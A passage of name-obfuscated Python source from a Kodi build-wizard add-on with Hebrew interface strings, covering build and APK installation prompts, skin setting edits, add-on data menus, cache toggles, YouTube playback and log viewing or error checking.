			O0O00OO0OOOOOOO0O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4315
			OO000OO0O0000OO00 =re .compile (O0O00OO0OOOOOOO0O ).findall (O000O0O00OO0O0OOO )[0 ]#line:4316
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'w')#line:4317
			O00OO0OOO0OOOO0OO .write (O000O0O00OO0O0OOO .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OO000OO0O0000OO00 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4318
			O00OO0OOO0OOOO0OO .close ()#line:4319
			O000O000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4323
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'r')#line:4325
			O000O0O00OO0O0OOO =O00OO0OOO0OOOO0OO .read ()#line:4326
			O00OO0OOO0OOOO0OO .close ()#line:4327
			O0O00OO0OOOOOOO0O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4328
			OO000OO0O0000OO00 =re .compile (O0O00OO0OOOOOOO0O ).findall (O000O0O00OO0O0OOO )[0 ]#line:4329
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'w')#line:4330
			O00OO0OOO0OOOO0OO .write (O000O0O00OO0O0OOO .replace ('<setting id="show.cdart" type="bool%s/setting>'%OO000OO0O0000OO00 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4331
			O00OO0OOO0OOOO0OO .close ()#line:4332
			O000O000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4336
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'r')#line:4338
			O000O0O00OO0O0OOO =O00OO0OOO0OOOO0OO .read ()#line:4339
			O00OO0OOO0OOOO0OO .close ()#line:4340
			O0O00OO0OOOOOOO0O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4341
			OO000OO0O0000OO00 =re .compile (O0O00OO0OOOOOOO0O ).findall (O000O0O00OO0O0OOO )[0 ]#line:4342
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'w')#line:4343
			O00OO0OOO0OOOO0OO .write (O000O0O00OO0O0OOO .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OO000OO0O0000OO00 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4344
			O00OO0OOO0OOOO0OO .close ()#line:4345
		except :#line:4350
			pass #line:4351
def thirdPartyInstall (OO00OOOOO0OO0OO00 ,O0OOO0OO000O0OO00 ):#line:4353
	if not wiz .workingURL (O0OOO0OO000O0OO00 ):#line:4354
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4355
	O00O000OOO0OO000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOOOO0OO0OO00 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4356
	if O00O000OOO0OO000O ==1 :#line:4357
		freshStart ('third',True )#line:4358
	wiz .clearS ('build')#line:4359
	OOO0O0000000O00O0 =OO00OOOOO0OO0OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4360
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4361
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOO0OO0OO00 ),'','אנא המתן')#line:4362
	O0O0O0O0O0OO0O000 =os .path .join (PACKAGES ,'%s.zip'%OOO0O0000000O00O0 )#line:4363
	try :os .remove (O0O0O0O0O0OO0O000 )#line:4364
	except :pass #line:4365
	downloader .download (O0OOO0OO000O0OO00 ,O0O0O0O0O0OO0O000 ,DP )#line:4366
	xbmc .sleep (1000 )#line:4367
	OO00O00OO00000O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOO0OO0OO00 )#line:4368
	DP .update (0 ,OO00O00OO00000O0O ,'','אנא המתן')#line:4369
	OO00OOO000O0O0000 ,O0OOOO00000OOOOOO ,OOOO0O00O0O000O00 =extract .all (O0O0O0O0O0OO0O000 ,HOME ,DP ,title =OO00O00OO00000O0O )#line:4370
	if int (float (OO00OOO000O0O0000 ))>0 :#line:4371
		wiz .fixmetas ()#line:4372
		wiz .lookandFeelData ('save')#line:4373
		wiz .defaultSkin ()#line:4374
		wiz .setS ('installed','true')#line:4376
		wiz .setS ('extract',str (OO00OOO000O0O0000 ))#line:4377
		wiz .setS ('errors',str (O0OOOO00000OOOOOO ))#line:4378
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00OOO000O0O0000 ,O0OOOO00000OOOOOO ))#line:4379
		try :os .remove (O0O0O0O0O0OO0O000 )#line:4380
		except :pass #line:4381
		if int (float (O0OOOO00000OOOOOO ))>0 :#line:4382
			OO0O0O00OO000OOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOO0OO0OO00 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00OOO000O0O0000 ,'%',COLOR1 ,O0OOOO00000OOOOOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4383
			if OO0O0O00OO000OOOO :#line:4384
				if isinstance (O0OOOO00000OOOOOO ,unicode ):#line:4385
					OOOO0O00O0O000O00 =OOOO0O00O0O000O00 .encode ('utf-8')#line:4386
				wiz .TextBox (ADDONTITLE ,OOOO0O00O0O000O00 )#line:4387
	DP .close ()#line:4388
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4389
	if INSTALLMETHOD ==1 :O00OOOO0OO0OOO0OO =1 #line:4390
	elif INSTALLMETHOD ==2 :O00OOOO0OO0OOO0OO =0 #line:4391
	else :O00OOOO0OO0OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4392
	if O00OOOO0OO0OOO0OO ==1 :wiz .reloadFix ()#line:4393
	else :wiz .killxbmc (True )#line:4394
def testTheme (OOOOO00OOOOO0OOOO ):#line:4396
	OOOOO00OOOO000OOO =zipfile .ZipFile (OOOOO00OOOOO0OOOO )#line:4397
	for OO0O000O0O0000000 in OOOOO00OOOO000OOO .infolist ():#line:4398
		if '/settings.xml'in OO0O000O0O0000000 .filename :#line:4399
			return True #line:4400
	return False #line:4401
def testGui (OO00000O00OO0O0OO ):#line:4403
	OOO0O0OO0OO000000 =zipfile .ZipFile (OO00000O00OO0O0OO )#line:4404
	for OOOO00O0O0OOO0OOO in OOO0O0OO0OO000000 .infolist ():#line:4405
		if '/guisettings.xml'in OOOO00O0O0OOO0OOO .filename :#line:4406
			return True #line:4407
	return False #line:4408
def apkInstaller (OOO0OOO0O0OOO0OOO ,O0000OOO0000O000O ):#line:4410
	wiz .log (OOO0OOO0O0OOO0OOO )#line:4411
	wiz .log (O0000OOO0000O000O )#line:4412
	if wiz .platform ()=='android':#line:4413
		OOO00O000OO00O00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOO0O0OOO0OOO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4414
		if not OOO00O000OO00O00O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4415
		O0OOO000000OO0OO0 =OOO0OOO0O0OOO0OOO #line:4416
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4417
		if not wiz .workingURL (O0000OOO0000O000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4418
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO000000OO0OO0 ),'','אנא המתן')#line:4419
		OOOO0O0OO000OO000 =os .path .join (PACKAGES ,"%s.apk"%OOO0OOO0O0OOO0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4420
		try :os .remove (OOOO0O0OO000OO000 )#line:4421
		except :pass #line:4422
		downloader .download (O0000OOO0000O000O ,OOOO0O0OO000OO000 ,DP )#line:4423
		xbmc .sleep (100 )#line:4424
		DP .close ()#line:4425
		notify .apkInstaller (OOO0OOO0O0OOO0OOO )#line:4426
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOOO0O0OO000OO000 +'")')#line:4427
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4428
def createMenu (O00OO00OOO0OO000O ,OOO000O00O0O0OOO0 ,OOO000OOOO0O0O0O0 ):#line:4434
	if O00OO00OOO0OO000O =='saveaddon':#line:4435
		O0OO0OOOOOOO0O00O =[]#line:4436
		OO00O0OO0O0OO0OO0 =urllib .quote_plus (OOO000O00O0O0OOO0 .lower ().replace (' ',''))#line:4437
		OO0O0000000O0OO0O =OOO000O00O0O0OOO0 .replace ('Debrid','Real Debrid')#line:4438
		O0OO0O0OO0OOO0O0O =urllib .quote_plus (OOO000OOOO0O0O0O0 .lower ().replace (' ',''))#line:4439
		OOO000OOOO0O0O0O0 =OOO000OOOO0O0O0O0 .replace ('url','URL Resolver')#line:4440
		O0OO0OOOOOOO0O00O .append ((THEME2 %OOO000OOOO0O0O0O0 .title (),' '))#line:4441
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Save %s Data'%OO0O0000000O0OO0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00O0OO0O0OO0OO0 ,O0OO0O0OO0OOO0O0O )))#line:4442
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Restore %s Data'%OO0O0000000O0OO0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00O0OO0O0OO0OO0 ,O0OO0O0OO0OOO0O0O )))#line:4443
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Clear %s Data'%OO0O0000000O0OO0O ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO00O0OO0O0OO0OO0 ,O0OO0O0OO0OOO0O0O )))#line:4444
	elif O00OO00OOO0OO000O =='save':#line:4445
		O0OO0OOOOOOO0O00O =[]#line:4446
		OO00O0OO0O0OO0OO0 =urllib .quote_plus (OOO000O00O0O0OOO0 .lower ().replace (' ',''))#line:4447
		OO0O0000000O0OO0O =OOO000O00O0O0OOO0 .replace ('Debrid','Real Debrid')#line:4448
		O0OO0O0OO0OOO0O0O =urllib .quote_plus (OOO000OOOO0O0O0O0 .lower ().replace (' ',''))#line:4449
		OOO000OOOO0O0O0O0 =OOO000OOOO0O0O0O0 .replace ('url','URL Resolver')#line:4450
		O0OO0OOOOOOO0O00O .append ((THEME2 %OOO000OOOO0O0O0O0 .title (),' '))#line:4451
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Register %s'%OO0O0000000O0OO0O ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO00O0OO0O0OO0OO0 ,O0OO0O0OO0OOO0O0O )))#line:4452
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Save %s Data'%OO0O0000000O0OO0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00O0OO0O0OO0OO0 ,O0OO0O0OO0OOO0O0O )))#line:4453
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Restore %s Data'%OO0O0000000O0OO0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00O0OO0O0OO0OO0 ,O0OO0O0OO0OOO0O0O )))#line:4454
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Import %s Data'%OO0O0000000O0OO0O ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO00O0OO0O0OO0OO0 ,O0OO0O0OO0OOO0O0O )))#line:4455
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Clear Addon %s Data'%OO0O0000000O0OO0O ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO00O0OO0O0OO0OO0 ,O0OO0O0OO0OOO0O0O )))#line:4456
	elif O00OO00OOO0OO000O =='install':#line:4457
		O0OO0OOOOOOO0O00O =[]#line:4458
		O0OO0O0OO0OOO0O0O =urllib .quote_plus (OOO000OOOO0O0O0O0 )#line:4459
		O0OO0OOOOOOO0O00O .append ((THEME2 %OOO000OOOO0O0O0O0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OO0O0OO0OOO0O0O )))#line:4460
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OO0O0OO0OOO0O0O )))#line:4461
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OO0O0OO0OOO0O0O )))#line:4462
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OO0O0OO0OOO0O0O )))#line:4463
		O0OO0OOOOOOO0O00O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OO0O0OO0OOO0O0O )))#line:4464
	O0OO0OOOOOOO0O00O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4465
	return O0OO0OOOOOOO0O00O #line:4466
def toggleCache (OO00O0OO0O0OO0O0O ):#line:4468
	OOOO0OO00000OO0OO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4469
	OO00000OO0OOOO0O0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4470
	if OO00O0OO0O0OO0O0O in ['true','false']:#line:4471
		for O000OOO00OOO00O00 in OOOO0OO00000OO0OO :#line:4472
			wiz .setS (O000OOO00OOO00O00 ,OO00O0OO0O0OO0O0O )#line:4473
	else :#line:4474
		if not OO00O0OO0O0OO0O0O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4475
			try :#line:4476
				O000OOO00OOO00O00 =OO00000OO0OOOO0O0 [OOOO0OO00000OO0OO .index (OO00O0OO0O0OO0O0O )]#line:4477
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O000OOO00OOO00O00 ))#line:4478
			except :#line:4479
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO00O0OO0O0OO0O0O ))#line:4480
		else :#line:4481
			O0O0OOOOOO0000OOO ='true'if wiz .getS (OO00O0OO0O0OO0O0O )=='false'else 'false'#line:4482
			wiz .setS (OO00O0OO0O0OO0O0O ,O0O0OOOOOO0000OOO )#line:4483
def playVideo (O0000O0O0OO0O0O00 ):#line:4485
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0000O0O0OO0O0O00 )#line:4486
	if 'watch?v='in O0000O0O0OO0O0O00 :#line:4487
		O0OO00O0OO00O00O0 ,O00O0OO000OOOOO00 =O0000O0O0OO0O0O00 .split ('?')#line:4488
		OO0OO000000000OO0 =O00O0OO000OOOOO00 .split ('&')#line:4489
		for O00O000000O0O00O0 in OO0OO000000000OO0 :#line:4490
			if O00O000000O0O00O0 .startswith ('v='):#line:4491
				O0000O0O0OO0O0O00 =O00O000000O0O00O0 [2 :]#line:4492
				break #line:4493
			else :continue #line:4494
	elif 'embed'in O0000O0O0OO0O0O00 or 'youtu.be'in O0000O0O0OO0O0O00 :#line:4495
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0000O0O0OO0O0O00 )#line:4496
		O0OO00O0OO00O00O0 =O0000O0O0OO0O0O00 .split ('/')#line:4497
		if len (O0OO00O0OO00O00O0 [-1 ])>5 :#line:4498
			O0000O0O0OO0O0O00 =O0OO00O0OO00O00O0 [-1 ]#line:4499
		elif len (O0OO00O0OO00O00O0 [-2 ])>5 :#line:4500
			O0000O0O0OO0O0O00 =O0OO00O0OO00O00O0 [-2 ]#line:4501
	wiz .log ("YouTube URL: %s"%O0000O0O0OO0O0O00 )#line:4502
	yt .PlayVideo (O0000O0O0OO0O0O00 )#line:4503
def viewLogFile ():#line:4505
	OO00O0OO00000O00O =wiz .Grab_Log (True )#line:4506
	O00OOO00OO0O000O0 =wiz .Grab_Log (True ,True )#line:4507
	OOO0O0OOOO00O00OO =0 ;O0OO0O0O00O00O000 =OO00O0OO00000O00O #line:4508
	if not O00OOO00OO0O000O0 ==False and not OO00O0OO00000O00O ==False :#line:4509
		OOO0O0OOOO00O00OO =DIALOG .select (ADDONTITLE ,["View %s"%OO00O0OO00000O00O .replace (LOG ,""),"View %s"%O00OOO00OO0O000O0 .replace (LOG ,"")])#line:4510
		if OOO0O0OOOO00O00OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4511
	elif OO00O0OO00000O00O ==False and O00OOO00OO0O000O0 ==False :#line:4512
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4513
		return #line:4514
	elif not OO00O0OO00000O00O ==False :OOO0O0OOOO00O00OO =0 #line:4515
	elif not O00OOO00OO0O000O0 ==False :OOO0O0OOOO00O00OO =1 #line:4516
	O0OO0O0O00O00O000 =OO00O0OO00000O00O if OOO0O0OOOO00O00OO ==0 else O00OOO00OO0O000O0 #line:4518
	OO00OOO000000OOOO =wiz .Grab_Log (False )if OOO0O0OOOO00O00OO ==0 else wiz .Grab_Log (False ,True )#line:4519
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0OO0O0O00O00O000 ),OO00OOO000000OOOO )#line:4521
def errorChecking (log =None ,count =None ,all =None ):#line:4523
	if log ==None :#line:4524
		O0OO0OOO0OO0O00O0 =wiz .Grab_Log (True )#line:4525
		O00OO0OO0OOO00OOO =wiz .Grab_Log (True ,True )#line:4526
		if not O00OO0OO0OOO00OOO ==False and not O0OO0OOO0OO0O00O0 ==False :#line:4527
			O000000O000OO0OOO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0OO0OOO0OO0O00O0 .replace (LOG ,""),errorChecking (O0OO0OOO0OO0O00O0 ,True ,True )),"View %s: %s error(s)"%(O00OO0OO0OOO00OOO .replace (LOG ,""),errorChecking (O00OO0OO0OOO00OOO ,True ,True ))])#line:4528
			if O000000O000OO0OOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4529
		elif O0OO0OOO0OO0O00O0 ==False and O00OO0OO0OOO00OOO ==False :#line:4530
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4531
			return #line:4532
		elif not O0OO0OOO0OO0O00O0 ==False :O000000O000OO0OOO =0 #line:4533
		elif not O00OO0OO0OOO00OOO ==False :O000000O000OO0OOO =1 #line:4534
		log =O0OO0OOO0OO0O00O0 if O000000O000OO0OOO ==0 else O00OO0OO0OOO00OOO #line:4535
	if log ==False :#line:4536
		if count ==None :#line:4537
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4538
			return False #line:4539
		else :#line:4540
			return 0 #line:4541
	else :#line:4542
		if os .path .exists (log ):#line:4543
			O000O000O0OO0OOO0 =open (log ,mode ='r');O0000000OOOOO0O0O =O000O000O0OO0OOO0 .read ().replace ('\n','').replace ('\r','');O000O000O0OO0OOO0 .close ()#line:4544
			O00OOOOO000O00O0O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0000000OOOOO0O0O )#line:4545
			if not count ==None :#line:4546
				if all ==None :#line:4547
					OOO000O0O00OO0000 =0 #line:4548
					for O0O0OOOOOO000OO00 in O00OOOOO000O00O0O :#line:4549
						if ADDON_ID in O0O0OOOOOO000OO00 :OOO000O0O00OO0000 +=1 #line:4550
					return OOO000O0O00OO0000 #line:4551
				else :return len (O00OOOOO000O00O0O )#line:4552
			if len (O00OOOOO000O00O0O )>0 :#line:4553
				OOO000O0O00OO0000 =0 ;OO00000OOOOO0OOO0 =""#line:4554
				for O0O0OOOOOO000OO00 in O00OOOOO000O00O0O :#line:4555
					if all ==None and not ADDON_ID in O0O0OOOOOO000OO00 :continue #line:4556
					else :#line:4557
						OOO000O0O00OO0000 +=1 #line:4558
						OO00000OOOOO0OOO0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOO000O0O00OO0000 ,O0O0OOOOOO000OO00 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4559
				if OOO000O0O00OO0000 >0 :#line:4560
					wiz .TextBox (ADDONTITLE ,OO00000OOOOO0OOO0 )#line:4561
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4562
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4563
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4564
ACTION_PREVIOUS_MENU =10 #line:4566
ACTION_NAV_BACK =92 #line:4567
ACTION_MOVE_LEFT =1 #line:4568
ACTION_MOVE_RIGHT =2 #line:4569
ACTION_MOVE_UP =3 #line:4570
ACTION_MOVE_DOWN =4 #line:4571
ACTION_MOUSE_WHEEL_UP =104 #line:4572
ACTION_MOUSE_WHEEL_DOWN =105 #line:4573
ACTION_MOVE_MOUSE =107 #line:4574
ACTION_SELECT_ITEM =7 #line:4575
ACTION_BACKSPACE =110 #line:4576
ACTION_MOUSE_LEFT_CLICK =100 #line:4577
ACTION_MOUSE_LONG_CLICK =108 #line:4578
def LogViewer (default =None ):#line:4580
	class O0OO0OOOO0OO0000O (xbmcgui .WindowXMLDialog ):#line:4581
		def __init__ (OOO00OOO000O000OO ,*OO000OO00OOOO0O00 ,**OOOOO000OOOOO00OO ):#line:4582
			OOO00OOO000O000OO .default =OOOOO000OOOOO00OO ['default']#line:4583
		def onInit (O0O0O0000OOOOO000 ):#line:4585
			O0O0O0000OOOOO000 .title =101 #line:4586
			O0O0O0000OOOOO000 .msg =102 #line:4587
			O0O0O0000OOOOO000 .scrollbar =103 #line:4588
			O0O0O0000OOOOO000 .upload =201 #line:4589
			O0O0O0000OOOOO000 .kodi =202 #line:4590
			O0O0O0000OOOOO000 .kodiold =203 #line:4591
			O0O0O0000OOOOO000 .wizard =204 #line:4592
			O0O0O0000OOOOO000 .okbutton =205 #line:4593
			O00000O000OO00OOO =open (O0O0O0000OOOOO000 .default ,'r')#line:4594
			O0O0O0000OOOOO000 .logmsg =O00000O000OO00OOO .read ()#line:4595
			O00000O000OO00OOO .close ()#line:4596
			O0O0O0000OOOOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O0000OOOOO000 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4597
			O0O0O0000OOOOO000 .showdialog ()#line:4598
		def showdialog (OO0O0OO0000O0OO00 ):#line:4600
			OO0O0OO0000O0OO00 .getControl (OO0O0OO0000O0OO00 .title ).setLabel (OO0O0OO0000O0OO00 .titlemsg )#line:4601
			OO0O0OO0000O0OO00 .getControl (OO0O0OO0000O0OO00 .msg ).setText (wiz .highlightText (OO0O0OO0000O0OO00 .logmsg ))#line:4602
			OO0O0OO0000O0OO00 .setFocusId (OO0O0OO0000O0OO00 .scrollbar )#line:4603
		def onClick (O0000O00000OOOO0O ,OOOOO00OO0OOO0000 ):#line:4605
			if OOOOO00OO0OOO0000 ==O0000O00000OOOO0O .okbutton :O0000O00000OOOO0O .close ()#line:4606
			elif OOOOO00OO0OOO0000 ==O0000O00000OOOO0O .upload :O0000O00000OOOO0O .close ();uploadLog .Main ()#line:4607
			elif OOOOO00OO0OOO0000 ==O0000O00000OOOO0O .kodi :#line:4608
				O0O0O0OO0OOOOO0O0 =wiz .Grab_Log (False )#line:4609
				O0O0O00O0OO0OOOOO =wiz .Grab_Log (True )#line:4610
				if O0O0O0OO0OOOOO0O0 ==False :#line:4611
					O0000O00000OOOO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4612
					O0000O00000OOOO0O .getControl (O0000O00000OOOO0O .msg ).setText ("Log File Does Not Exists!")#line:4613
				else :#line:4614
					O0000O00000OOOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O00O0OO0OOOOO .replace (LOG ,''))#line:4615
					O0000O00000OOOO0O .getControl (O0000O00000OOOO0O .title ).setLabel (O0000O00000OOOO0O .titlemsg )#line:4616
					O0000O00000OOOO0O .getControl (O0000O00000OOOO0O .msg ).setText (wiz .highlightText (O0O0O0OO0OOOOO0O0 ))#line:4617
					O0000O00000OOOO0O .setFocusId (O0000O00000OOOO0O .scrollbar )#line:4618
			elif OOOOO00OO0OOO0000 ==O0000O00000OOOO0O .kodiold :#line:4619
				O0O0O0OO0OOOOO0O0 =wiz .Grab_Log (False ,True )#line:4620
				O0O0O00O0OO0OOOOO =wiz .Grab_Log (True ,True )#line:4621
				if O0O0O0OO0OOOOO0O0 ==False :#line:4622
					O0000O00000OOOO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4623
					O0000O00000OOOO0O .getControl (O0000O00000OOOO0O .msg ).setText ("Log File Does Not Exists!")#line:4624
				else :#line:4625
					O0000O00000OOOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O00O0OO0OOOOO .replace (LOG ,''))#line:4626
					O0000O00000OOOO0O .getControl (O0000O00000OOOO0O .title ).setLabel (O0000O00000OOOO0O .titlemsg )#line:4627
					O0000O00000OOOO0O .getControl (O0000O00000OOOO0O .msg ).setText (wiz .highlightText (O0O0O0OO0OOOOO0O0 ))#line:4628
					O0000O00000OOOO0O .setFocusId (O0000O00000OOOO0O .scrollbar )#line:4629
			elif OOOOO00OO0OOO0000 ==O0000O00000OOOO0O .wizard :#line:4630
				O0O0O0OO0OOOOO0O0 =wiz .Grab_Log (False ,False ,True )#line:4631
				O0O0O00O0OO0OOOOO =wiz .Grab_Log (True ,False ,True )#line:4632
				if O0O0O0OO0OOOOO0O0 ==False :#line:4633
					O0000O00000OOOO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4634
					O0000O00000OOOO0O .getControl (O0000O00000OOOO0O .msg ).setText ("Log File Does Not Exists!")#line:4635
				else :#line:4636
					O0000O00000OOOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O00O0OO0OOOOO .replace (ADDONDATA ,''))#line:4637
					O0000O00000OOOO0O .getControl (O0000O00000OOOO0O .title ).setLabel (O0000O00000OOOO0O .titlemsg )#line:4638
					O0000O00000OOOO0O .getControl (O0000O00000OOOO0O .msg ).setText (wiz .highlightText (O0O0O0OO0OOOOO0O0 ))#line:4639
					O0000O00000OOOO0O .setFocusId (O0000O00000OOOO0O .scrollbar )#line:4640
		def onAction (OO00OO0O0O000O0O0 ,OOOO0OO0OO0OOOO0O ):#line:4642
			if OOOO0OO0OO0OOOO0O ==ACTION_PREVIOUS_MENU :OO00OO0O0O000O0O0 .close ()#line:4643
			elif OOOO0OO0OO0OOOO0O ==ACTION_NAV_BACK :OO00OO0O0O000O0O0 .close ()#line:4644
	if default ==None :default =wiz .Grab_Log (True )#line:4645
